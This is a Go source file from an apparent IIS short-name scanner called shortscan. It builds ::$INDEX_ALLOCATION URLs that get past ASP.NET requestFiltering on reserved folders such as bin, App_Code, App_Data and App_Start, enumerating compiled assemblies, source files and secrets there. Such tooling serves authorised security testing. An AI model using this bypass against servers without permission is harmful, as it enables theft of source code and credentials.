package shortscan

import "strings"

// Convention-folder INDEX_ALLOCATION sweep.
//
// ASP.NET reserves a set of folders that hold the compiled application, its source and
// its data: /bin (App_Web_*.dll, App_Code.*.dll, *.compiled), App_Code (raw .cs/.vb),
// App_Data (*.mdf, *.json, *.xml dumps), and the App_*Resources/App_Themes trees. Every
// one of them is a requestFiltering hiddenSegment — a direct GET or ordinary recursion
// gets a 404 on the name, so shortscan never reaches inside them by walking the site.
//
// The ::$INDEX_ALLOCATION directory oracle is the one way in: `bin::$INDEX_ALLOCATION` is
// a different string from `bin`, so it slips past the hiddenSegment name check while NTFS
// still resolves it to the bin directory, and the 8.3 tilde oracle then enumerates the
// compiled assembly / source / data names inside. Those names feed checksum recovery (full
// App_Web_<hash>.dll) and --retrieve (the read step that turns "there is a hidden /bin"
// into "here is the compiled source"). Enumeration is unpatched; the read is gated on a
// retrieval vector (non-IIS/old-IIS front-end, cross-stack, or an aggressive-removal host).
//
// So -i (and --full) proactively probe these folders on every scanned directory — plain
// --auto no longer does (see cli.go's --auto help text); this is what the standalone -i
// mode did only for the site root's /bin, and here it runs per directory and across the
// reserved-folder set.

// sourceLeakFoldersAuto are the reserved/convention folders that carry compiled code,
// raw source and application data — swept by --auto. Includes the MVC trio
// (Views/Models/Controllers) because MVC is the dominant modern layout and those
// folders hold the controller/model .cs and the Razor views.
var sourceLeakFoldersAuto = []string{
	"bin", "App_Code", "App_Data",
	"Views", "Models", "Controllers",
}

// sourceLeakFoldersFull adds the remaining ASP.NET reserved + convention folders —
// swept by --full.
var sourceLeakFoldersFull = []string{
	"bin", "App_Code", "App_Data",
	"Views", "Models", "Controllers",
	"App_GlobalResources", "App_LocalResources",
	"App_Browsers", "App_WebReferences", "App_Themes", "Themes",
	// MVC/project convention folders that hold source and secrets. Views ships a
	// BlockViewHandler web.config that denies direct GETs, so the ::$INDEX_ALLOCATION
	// oracle is the way in just as with the App_* set. App_Start (Startup.cs,
	// RouteConfig, WebApiConfig, IdentityConfig) leaks OAuth/JWT secrets; Areas holds
	// nested Controllers/Models/Views; Migrations holds the EF schema + seed data.
	"Areas", "App_Start", "Migrations", "Properties",
}

// reservedFolderBase returns the last path segment of a trimmed (no trailing
// slash) URL/path and whether it case-insensitively names one of the reserved
// ASP.NET folders that only have a working 8.3 oracle through ::$INDEX_ALLOCATION
// — a bare directory otherwise has no differential status to key on, so scanning
// it directly is a guaranteed, uninformative "Vulnerable: No". Shared by
// indexChainURLs (child directories discovered mid-scan) and
// redirectReservedFolderURL (the user's own top-level target URL), so both
// recognise the same shape the same way.
func reservedFolderBase(trimmed string) (base string, isReserved bool) {
	base = trimmed
	if idx := strings.LastIndex(trimmed, "/"); idx >= 0 {
		base = trimmed[idx+1:]
	}
	folders := sourceLeakFoldersAuto
	if args.Full {
		folders = sourceLeakFoldersFull
	}
	for _, f := range folders {
		if strings.EqualFold(base, f) {
			return base, true
		}
	}
	return base, false
}

// redirectReservedFolderURL rewrites a user-given top-level target URL that IS
// itself one of the reserved ASP.NET folders (…/bin, …/App_Code, …) straight to
// its ::$INDEX_ALLOCATION form, when -i or --full is set. Without this, --auto/
// --full -i scanned the bare directory URL as its own target FIRST — calibrating,
// fingerprinting, and printing a guaranteed-negative "8.3 oracle: no" / "Vulnerable:
// No" block — and only THEN discovered and separately queued the ADS-suffixed form
// (via indexChainURLs) that actually carries the oracle, so a single real target
// produced two contradictory fingerprint blocks and a misleading false-negative
// verdict sandwiched next to the true positive. Folding the redirect into the
// user's own URL up front collapses that back into the one real scan. `-i` alone
// (no --auto/--full) is unaffected — that combination is the pre-existing
// standalone `testIndexAllocations` path and never reaches this function.
func redirectReservedFolderURL(u string) string {
	if !(args.Index || args.Full) {
		return u
	}
	if strings.Contains(strings.ToUpper(u), "$INDEX_ALLOCATION") || strings.Contains(u, "::$") {
		return u
	}
	trimmed := strings.TrimSuffix(u, "/")
	if _, isReserved := reservedFolderBase(trimmed); isReserved {
		return trimmed + "::$INDEX_ALLOCATION/"
	}
	return u
}

// indexChainURLs returns the ::$INDEX_ALLOCATION enumeration URLs for the ASP.NET reserved
// folders under a scanned directory, so a scan reaches into /bin & friends that
// requestFiltering hides from ordinary enumeration. It is opt-in and heavy (several probes
// per directory), so it is gated on -i (combine with --auto) or --full — plain --auto does
// NOT sweep. Returns nil when disabled or when baseURL already carries an ADS/INDEX_ALLOCATION
// token, so the sweep never chains into itself. De-dup across directories is the caller's
// `visited` map.
func indexChainURLs(baseURL string) []string {
	if !(args.Index || args.Full) {
		return nil
	}
	// Never chain a chain: if we are already inside an INDEX_ALLOCATION / ADS URL, stop.
	if strings.Contains(strings.ToUpper(baseURL), "$INDEX_ALLOCATION") || strings.Contains(baseURL, "::$") {
		return nil
	}
	trimmed := strings.TrimSuffix(baseURL, "/")
	dir := trimmed + "/"
	folders := sourceLeakFoldersAuto
	if args.Full {
		folders = sourceLeakFoldersFull
	}

	// If the scanned directory itself is already named after one of the reserved
	// folders (the user pointed shortscan directly at .../bin, .../App_Code, ...),
	// probe it in place rather than appending a second copy of the same name
	// beneath it (which would test the wrong, nonexistent nested path, e.g.
	// .../bin/bin::$INDEX_ALLOCATION instead of .../bin::$INDEX_ALLOCATION). In
	// practice redirectReservedFolderURL already rewrites a top-level target
	// before Scan() ever sees it, so this branch now mainly covers a reserved
	// folder discovered as a CHILD directory mid-scan (still bare, not yet chained).
	if _, isReserved := reservedFolderBase(trimmed); isReserved {
		return []string{trimmed + "::$INDEX_ALLOCATION/"}
	}

	out := make([]string, 0, len(folders))
	for _, f := range folders {
		out = append(out, dir+f+"::$INDEX_ALLOCATION/")
	}
	return out
}
